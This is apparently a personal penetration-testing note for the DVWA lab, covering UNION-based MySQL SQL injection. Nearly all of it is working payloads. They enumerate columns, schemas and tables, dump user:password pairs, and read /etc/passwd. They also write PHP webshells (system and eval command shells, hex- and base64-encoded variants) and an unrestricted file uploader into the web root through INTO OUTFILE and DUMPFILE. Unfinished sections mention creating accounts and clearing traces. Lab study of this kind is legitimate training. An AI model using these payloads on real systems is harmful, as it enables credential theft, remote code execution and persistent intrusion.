# UNION Query SQL Injection

#dvwa #sqli

Refer to [[Lab Simulation Setup/Webapps/DVWA/Setup#^214bb7|DVWA Lab Setup]] for the attacker machine to map the IP address in the `/etc/hosts`.

## 01 - Dump Database

### 1.1 - Columns Enumeration

#### 1.1.1 - ORDER Detection

We need to determine number of columns before we perform

```sql
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
```

`<Insert screenshot ORDER BY 1>`

`<Insert screenshot ORDER BY 3>`

```
Unknown column '3' in 'order clause'
```

3 - 1 = 2

We have two columns.

#### 1.1.2 - UNION Detection

```sql
' UNION SELECT 1, 2#

' UNION SELECT 1, 2, 3#

' UNION SELECT NULL, NULL#

' UNION SELECT NULL, NULL, NULL#
```

### 1.2 - Discovery and Enumeration

#### 1.2.1 - UNION Enumeration

Sometimes when we try to retrieve error messages. Sometimes the warning messages may not provide us the SQL server software might be running. However, we can discover it even further to grab the version of the DBMS back-end software is running.

```sql
' UNION SELECT 1, @@VERSION#

' OR 1=1 UNION SELECT 1, @@VERSION#

' UNION SELECT NULL, @@VERSION#

' OR 1=1 UNION SELECT NULL, @@VERSION#
```

#### 1.2.2 - Schema Database Enumeration

```sql
' UNION SELECT NULL, schema_name FROM information_schema.schemata#
```

`<insert screenshot>`

Let's enumerate the tables

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables#

' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#
```

`<Insert screenshot>`

Let's narrow it down

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_name like 'user%'#
```

`<Insert screenshot>`

Let's note down the tables we've discovered that are potential to retrieve data

```
users
user
accounts
users_users
```

Let's enumerate the columns

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns#
```

Let's note down the columns we've discovered that are potential to retrieve data

```
user
users
password
username
```

### 1.3 - Exploit

```sql
' UNION SELECT user, password FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT user || ':' || password, NULL FROM users#

' UNION SELECT concat(user,':',password), NULL FROM users#

' UNION SELECT group_concat(user,':',password), NULL FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT concat(user,'~',password), NULL FROM users#

' UNION SELECT group_concat(user,'~',password), NULL FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT concat(user,'\n',password), NULL FROM users#

' UNION SELECT concat(user,0x0a,password), NULL FROM users#

' UNION SELECT group_concat(user,0x0a,password), NULL FROM users#
```

`<Insert screenshot>`

## 02 - Initial Foothold and Persistence

### 2.1 - Create User Account

TODO: Figure out using SQL queries to create a user account

#### 2.1.1 - Conditions

1. The DB user must have **SELECT**, **INSERT**, **UPDATE**, **DELETE** privileges.

#### 2.1.2 - Enumeration...

#### 2.1.3 - INSERT values

`' INSERT INTO dvwa.users values()#`

#### 2.1.4 - UPDATE values

`' UPDATE INTO dvwa.users values()#`

#### 2.1.5 - Clean Traces

- DELETE Query after INSERTing

- UPDATE Query

### 2.2 - Webshell

#### 2.2.1 - Conditions

These are the required conditions to leverage this vulnerability.

1. The DB user must have **FILE** and **SELECT** privileges.

2. Find the web root directory using the enumeration methods.

3. The web root directory must have write permissions.

#### 2.2.2 - Web Root Enumeration

Note: This step is necessary to write a webshell.

- Using SQL Query statements will disclose the PHP warning messages to find the absolute path of the web root directory.

```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd')#

' UNION SELECT LOAD_FILE('/etc/passwd'), NULL#

' UNION SELECT NULL, LOAD_FILE('/etc/passwd')#
```

`' UNION SELECT NULL, @@DATADIR#`

- When you execute the `LOAD_FILE()` function. Keep an eye out the php warning syntax messages. It'll provide you the absolute path to write php files.

```sql
' UNION SELECT 'test', NULL INTO OUTFILE '/tmp/file.txt'#

' UNION SELECT 1, LOAD_FILE('/tmp/file.txt')#

' UNION SELECT 'test', NULL INTO OUTFILE '/dev/shm/file.txt'#

' UNION SELECT 1, LOAD_FILE('/dev/shm/file.txt')#
```

**Hex encoded**

```sql
' UNION SELECT 0x74657374, NULL INTO OUTFILE '/dev/shm/file.txt'#

' UNION SELECT 1, LOAD_FILE('/dev/shm/file.txt')#
```

`<insert_screenshot from any of the SQLi commands for directory enumeration>`

`<insert screenshot any of the OS enumeration from above>`

- We'll be using the SQL queries to enumerate file destination that may give us the directory web root path to write the webshell.

TODO: Demonstrate from the enumeration phase to find the web root directory

`<insert_screenshot from any of the SQLi commands for directory enumeration>`

- Spidering the URL with the use of `katana` to enumerate directories.

TODO: paste terminal commands and output

- Bruteforce the directories in the URL with tools such as, `gobuster`

TODO: paste terminal commands and output

#### 2.2.3 - DB Enumeration

```sql
' UNION SELECT NULL, DATABASE()#

' UNION SELECT NULL, USER()#

' UNION SELECT NULL * FROM information_schema.PRIVILEGES#

' UNION SELECT NULL, GROUP_CONCAT(GRANTEE, '->', IS_GRANTABLE, '<br>') FROM information_schema.USER_PRIVILEGES#
```

#### 2.2.4 - Exploit

##### 2.2.4.1 - Exploit via OUTFILE

###### 2.2.4.1.1 - Simple Webshell

Note: There are a few things you need to know about these error messages.

1. MySQL can't find the source. To solve this error, you need to provide the absolute path to source.

```sql
' UNION SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>', NULL INTO OUTFILE '/var/html/shell.php'#

Can't create/write to file '/var/html/shell.php' (Errcode: 2 "No such file or directory")
```

2. Ensure the directory has write permissions.

```sql
' UNION SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>', NULL INTO OUTFILE '/var/www/shell.php'#

Can't create/write to file '/var/www/shell.php' (Errcode: 13 "Permission denied")
```

- **Save the webshell with an absolute path**

```sql
' UNION SELECT '<?php $cmd=$_GET["cmd"];system($cmd);?>', NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
```

`<insert_screenshosts>`

TODO: Understand how `LINES TERMINATE BY` SQL query works...

```sql
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
```

###### 2.2.4.1.2 - Uploader

You can use a file uploader that allows you to upload anything such as custom [[Pentesting Phases/Initial Access/Callback Shells/Webshells]].

`$ cat uploader.php`

---

```php
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Upload</title>
    </head>
    <body>
        <h2>File Upload</h2>
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="submit">
        </form>

        <?php
        if (isset($_POST['submit'])) {
            if (!empty($_FILES['fileToUpload']['name'])) {
                $targetDir = './'; // Upload to the same directory as the PHP script
                $targetFile = $targetDir . basename($_FILES['fileToUpload']['name']);

                if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
                    echo "File uploaded successfully.";
                } else {
                    echo "Sorry, there was an error uploading your file.";
                }
            } else {
                echo "Please choose a file to upload.";
            }
        }
        ?>
    </body>
</html>
```

Here's a one PHP liner.

```php
<?php if(isset($_POST['submit'])){$t='./';$f=$t.basename($_FILES['fileToUpload']['name']);if(move_uploaded_file($_FILES['fileToUpload']['tmp_name'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?> <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>File Upload</title></head><body><h2>File Upload</h2><form action="<?=$_SERVER['PHP_SELF']?>" method="POST" enctype="multipart/form-data"><input type="file" name="fileToUpload" id="fileToUpload"><input type="submit" value="Upload" name="submit"></form></body></html>
```

SQL Query for reference.

```sql
SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>' INTO OUTFILE '/path/to/uploader.php'
```

Convert it to SQLi exploit with **UNION SELECT**.

```sql
' UNION SELECT '<?php if(isset($_POST[\'submit\'])){$t=\'./\';$f=$t.basename($_FILES[\'fileToUpload\'][\'name\']);if(move_uploaded_file($_FILES[\'fileToUpload\'][\'tmp_name\'],$f))echo"File uploaded successfully.";else echo"Sorry, there was an error uploading your file.";}?>\n<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>File Upload</title></head><body><h2>File Upload</h2><form action=\"<?=$_SERVER[\'PHP_SELF\']?>\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"fileToUpload\" id=\"fileToUpload\"><input type=\"submit\" value=\"Upload\" name=\"submit\"></form></body></html>', NULL INTO OUTFILE '/var/www/html/dvwa/uploader.php'#
```

- **Base64 encoded**

```sql
' UNION SELECT FROM_BASE64("<base64_encoded>"), NULL INTO OUTFILE '/var/www/html/dvwa/file.php'#
```

```sql
$ echo "<?php \$cmd=\$_GET[\"cmd\"];system(\$cmd);?>" | base64
PD9waHAgJGNtZD0kX0dFVFsiY21kIl07c3lzdGVtKCRjbWQpOz8+Cg==

' UNION SELECT FROM_BASE64("PD9waHAgJGNtZD0kX0dFVFsiY21kIl07c3lzdGVtKCRjbWQpOz8+Cg=="), NULL INTO OUTFILE '/var/www/html/dvwa/shell.php'#
```

###### 2.2.4.1.3 - Evaluate PHP Code

```php
<?php eval($_GET[evaluate]); ?>
```

SQL Query for reference.

```sql
SELECT '<?php eval($_GET[evaluate]); ?>', NULL INTO OUTFILE '/var/www/html/dvwa/eval_php.php'
```

Convert it to SQLi exploit with **UNION SELECT**.

```sql
' UNION SELECT '<?php eval($_GET[evaluate]); ?>', NULL INTO OUTFILE '/var/www/html/dvwa/eval_php.php'#
```

```
"http://dvwa.local/dvwa/eval_php.php?evaluate=phpinfo()"
```

`<insert screenshots>`

- **Base64 encoded**

```
"http://dvwa.local/dvwa/eval_php.php?evaluate=if(file_put_contents('webshell.php', base64_decode(<base64_encoded>))){ echo 1;} else {echo 2;}"
```

##### 2.2.4.2 - Exploit via DUMPFILE

###### 2.2.4.2.1 - Simple Webshell

TODO: Replicate the methods from this video https://www.youtube.com/watch?v=FjgKtBAiLKQ

```sql
CREATE TABLE `dvwa`.`user_input`(
`column_1` VARCHAR(1000) NOT NULL
) ENGINE = MYISAM;

INSERT INTO user_input values('<?php $cmd=$_GET["cmd"];system($cmd);?>')

SELECT * INTO DUMPFILE '/var/www/html/dvwa/shell.php' FROM user_input;
```

###### 2.2.4.2.2 - Uploader

```sql
CREATE TABLE `dvwa`.`user_upload`(
`column_1` VARCHAR(1000) NOT NULL
) ENGINE = MYISAM;

INSERT INTO user_upload values('<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Upload</title>
    </head>
    <body>
        <h2>File Upload</h2>
        <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="POST" enctype="multipart/form-data">
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload" name="submit">
        </form>

        <?php
        if (isset($_POST["submit"])) {
            if (!empty($_FILES["fileToUpload"]["name"])) {
                $targetDir = "./"; // Upload to the same directory as the PHP script
                $targetFile = $targetDir . basename($_FILES["fileToUpload"]["name"]);

                if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
                    echo "File uploaded successfully.";
                } else {
                    echo "Sorry, there was an error uploading your file.";
                }
            } else {
                echo "Please choose a file to upload.";
            }
        }
        ?>
    </body>
</html>')

SELECT * INTO DUMPFILE '/var/www/html/dvwa/uploader.php' FROM user_upload;
```
## References

- [MySQL Documentation: Privileges](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html)

- [S12 - H4CK: SQL Injection Medium Writeup](https://systemweakness.com/sql-injection-fe6809dcca69)

- [Acunetix: SQLi Part 3 - The anatomy of an SQL Injection attack](https://www.acunetix.com/blog/articles/sqli-part-3-the-anatomy-of-an-sql-injection-attack/)

- [Exploiting SQL Injection Example](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/)

- [PayloadsAllTheThings SQL Injection: MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

- [Stackoverflow: How do I write files using SQL Injection](https://stackoverflow.com/questions/58160504/how-do-i-write-files-using-sql-injection)